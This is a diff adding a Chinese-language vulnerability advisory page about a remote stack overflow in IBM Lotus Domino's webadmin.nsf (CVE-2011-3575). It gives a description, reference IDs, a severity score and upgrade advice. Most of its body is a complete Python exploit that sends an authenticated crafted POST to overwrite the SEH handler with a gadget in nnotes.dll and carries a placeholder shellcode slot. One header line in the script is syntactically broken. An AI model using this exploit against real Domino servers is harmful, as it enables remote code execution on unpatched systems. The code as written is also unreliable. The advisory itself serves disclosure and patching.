@@ -1,0 +1,396 @@
+
+<!DOCTYPE html>
+
+<html>
+
+	<head>
+
+		<meta charset="utf-8">
+
+        <link rel="stylesheet" href="/vulbox/source/table.css" />
+
+	</head>
+
+	<body class="dialog">
+
+		<div class="content">
+
+			<div class="wrap">
+
+				<div class="cont">
+
+					<table class="table table-hover table-mc-light-blue" style="margin-top: 0;">
+
+						<thead>
+
+							<tr class="first_title">
+
+								<th colspan="2">漏洞描述</th>
+
+							</tr>
+
+						</thead>
+
+						<tbody>
+
+							<tr>
+
+								<th width="70">漏洞名称</th>
+
+								<td>
+
+								    <img style="float:left;" src="/vulbox/source/h.gif" align="absmiddle"/>
+
+								<span style="float:left;margin-top:1px;margin-top:2px\9;">IBM Lotus Domino “NSFComputeEvaluateExt()”函数远程栈缓冲区溢出漏洞</span>
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th valign="top">详细描述</th>
+
+								<td valign="top">
+
+									Lotus Domino是集电子邮件、文档数据库、快速应用开发技术以及Web技术为一体的电子邮件与群集平台。<br />
+
+									<br />
+
+									IBM Lotus Domino在&quot;NSFComputeEvaluateExt()&quot;函数的实现上存在远程栈缓冲区溢出漏洞，远程攻击者可利用此漏洞以系统级别的权限执行任意代码，完全控制受影响计算机。<br />
+
+									<br />
+
+									WebAdmin.nsf模块没有进行正确的边界检查。通过发送特制的HTTP POST请求，远程已验证攻击者可以系统级别的权限造成缓冲区溢出和执行任意代码。<br />
+
+									<br />
+
+									&lt;*来源：rmallof<br />
+
+									  <br />
+
+									  链接：http://www.research.reversingcode.com/index.php/advisories/73-ibm-ssd-1012211<br />
+
+									        http://xforce.iss.net/xforce/xfdb/69802<br />
+
+									*&gt;<br />
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th  valign="top">解决方案</th>
+
+								<td valign="top">
+
+									测试方法：<br />
+
+									警 告<br />
+
+									<br />
+
+									以下程序(方法)可能带有攻击性，仅供安全研究与教学之用。使用者风险自负！<br />
+
+									<br />
+
+									#!/usr/bin/python<br />
+
+									<br />
+
+									import socket,struct,sys,os<br />
+
+									<br />
+
+									host=&quot;192.168.x.y&quot;                    #server ip here!<br />
+
+									cookie=&quot;1234567890abcdef&quot;                            #Set your Cookie credential here! Cookie = base64((usr:pwd))<br />
+
+									#Shellcode = Using XOR [reg],reg to crash (&quot;like&quot; INT3 :))<br />
+
+									Shellcode=chr(0x30)<br />
+
+									<br />
+
+									server=host,80<br />
+
+									SEH=struct.pack(&quot;&lt;L&quot;,0x60404672)                       # POP ESI - POP EBP - RETN nnotes.dll.60404672<br />
+
+									nSEH=struct.pack(&quot;&lt;L&quot;,0x4141347A)                      # INC ecx  ;NOP <br />
+
+									                                                        # INC ecx  ;NOP<br />
+
+									                            # JPE  slep ;Detour<br />
+
+									vars=&quot;__Click=0&amp;tHPRAgentName=&quot;                         #tHPRAgentName =&gt; Vulnerable POST variable<br />
+
+									buf=&quot;A&quot;*436                                             #sended buffer-nSEH-SEH<br />
+
+									slep=&quot;X&quot;*46                                             #pre-shellcode to fix JPE landing<br />
+
+									<br />
+
+									#This function forges our POST request (with our Shellcode sure)<br />
+
+									def buildPOST(h,b,c):                <br />
+
+									    P=&quot;POST /webadmin.nsf/fmHttpPostRequest?OpenForm&amp;Seq=1 HTTP/1.1\r\n&quot;<br />
+
+									    P+=&quot;Host: &quot;+h+&quot;\r\n&quot;<br />
+
+									    P+=&quot;User-Agent: oh sure\r\n&quot;<br />
+
+									    P+=&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;<br />
+
+									    P+=&quot;Accept-Language: chinnese plz\r\n&quot;<br />
+
+									    P+=&quot;Accept-Encoding: gzip,deflate\r\n&quot;<br />
+
+									    P+=&quot;Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n&quot;<br />
+
+									    P+=&quot;Keep-Alive: 115\r\n&quot;<br />
+
+									    P+=&quot;Connection: keep-alive\r\n&quot;<br />
+
+									    P+=&quot;Referer:  http://&quot;+h+&quot;/webadmin.nsf/dlgConfigPorts?ReadForm&amp;objref=16\r\n&quot;<br />
+
+									    P+=&quot;Cookie: CWCweb=\\&quot;savedLocale:en\\&quot;\r\n&quot;<br />
+
+									    P+=&quot;Authorization: Basic &quot;+c+&quot;\r\n&quot;<br />
+
+									    P+=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;<br />
+
+									    P+=&quot;Content-Length: s\r\n&quot;  str(len(b))<br />
+
+									    P+=&quot;\r\n&quot;<br />
+
+									    P+=b<br />
+
+									    return P<br />
+
+									<br />
+
+									def main():<br />
+
+									    if os.name==&quot;nt&quot;:<br />
+
+									        os.system(&quot;cls&quot;)<br />
+
+									    else:<br />
+
+									        os.system(&quot;clear&quot;)<br />
+
+									    print&quot;\t-&gt;[ IBM Lotus Domino 8.5.2 Remote Stack Overflow ]&lt;-&quot;<br />
+
+									    print&quot;\t        -&gt;[Remote Code Execution Exploit]&lt;-\n\n&quot;<br />
+
+									    print&quot;[+] Crafting buffer...&quot;<br />
+
+									    #Creating POST content data<br />
+
+									    buffer=vars+buf+nSEH+SEH+slep+Shellcode<br />
+
+									    print&quot;[+] Connecting to server...&quot;<br />
+
+									    s=socket.socket()<br />
+
+									    #Trying connect to IBM Lotus Domino HTTP server<br />
+
+									    try:<br />
+
+									        s.connect(server)<br />
+
+									    #We goin to exit if this fails<br />
+
+									    except:<br />
+
+									        print&quot;[-] Error connecting to remote server...&quot;<br />
+
+									        sys.exit(0)<br />
+
+									    print&quot;[+] Crafting POST request...&quot;<br />
+
+									    #Crafting final POST<br />
+
+									    post=buildPOST(host,buffer,cookie)<br />
+
+									    print&quot;[+] 0k, sending...&quot;<br />
+
+									    #Sending Shellcode to remote server<br />
+
+									    s.send(post)<br />
+
+									    #Server is running? Some fails :S<br />
+
+									    try:<br />
+
+									        print s.recv(2048)<br />
+
+									        print&quot;[x] Exploit failed!&quot;<br />
+
+									    #Else we achieve remote code execution successfully<br />
+
+									    except:<br />
+
+									        print&quot;[+] Done!&quot; <br />
+
+									    s.close()<br />
+
+									    print&quot;\n[*] By @rmallof&quot;<br />
+
+									<br />
+
+									if __name__==&quot;__main__&quot;:<br />
+
+									    main()<br />
+
+									<br />
+
+									建议：<br />
+
+									<br />
+
+									Lotus<br />
+
+									-----<br />
+
+									建议升级Lotus Domino产品至最新版本，请到厂商的主页下载：<br />
+
+									<br />
+
+									http://www14.software.ibm.com/webapp/download/search.jsp?pn=IBM+Domino<br />
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>威胁分值</th>
+
+								<td>9</td>
+
+							</tr>
+
+							<tr>
+
+								<th>危险插件</th>
+
+								<td>否</td>
+
+							</tr>
+
+							<tr>
+
+                                <th>发现日期</th>
+
+                                <td>2011-09-19</td>
+
+                            </tr>
+
+							<tr>
+
+                                <th>发布日期</th>
+
+                                <td>2012-11-06</td>
+
+                            </tr>
+
+							<tr>
+
+								<th>CVE</th>
+
+								<td>
+
+									<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3575" target="_blank">CVE-2011-3575</a>&nbsp;
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>BUGTRAQ</th>
+
+								<td>
+
+									<a href="http://www.securityfocus.com/bid/49705" target="_blank">49705</a>
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>NSFOCUS</th>
+
+								<td>
+
+									<a href="http://www.nsfocus.net/index.php?act=sec_bug&do=view&bug_id=17791" target="_blank">17791</a>
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>CNNVD编号</th>
+
+								<td>
+
+									CNNVD-201109-313&nbsp;&nbsp;
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>CNCVE编号</th>
+
+								<td>
+
+									CNCVE-20113575&nbsp;&nbsp;
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>CVSS评分</th>
+
+								<td>
+
+									9.0&nbsp;&nbsp;
+
+								</td>
+
+							</tr>
+
+							<tr>
+
+								<th>CNVD编号</th>
+
+								<td>
+
+									CNVD-2011-3760&nbsp;&nbsp;
+
+								</td>
+
+							</tr>
+
+						</tbody>
+
+					</table>
+
+				</div>
+
+			</div>
+
+		</div>
+
+	</body>
+
+</html>
